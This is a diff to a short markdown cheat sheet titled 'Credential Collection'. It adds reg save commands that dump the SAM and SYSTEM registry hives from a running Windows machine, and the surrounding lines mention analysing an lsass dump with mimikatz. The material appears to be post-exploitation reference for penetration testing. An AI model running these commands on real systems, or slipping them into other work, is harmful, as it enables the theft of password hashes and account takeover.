@@ -1,6 +1,16 @@
 
 # Credential Collection
 
+## GET SAM and Security when system running
+
+On remote computer extrach SAM and SYSTEM 
+
+
+	reg save hklm\sam c:\sam
+	reg save hklm\system c:\system
+
+[Credit](https://superuser.com/a/1088644)
+
 ## mimikatz lsass.DMP local analyze
 
 if we cant run mimikatz on target machine, we can get dump of lsass process and analyze local computer.
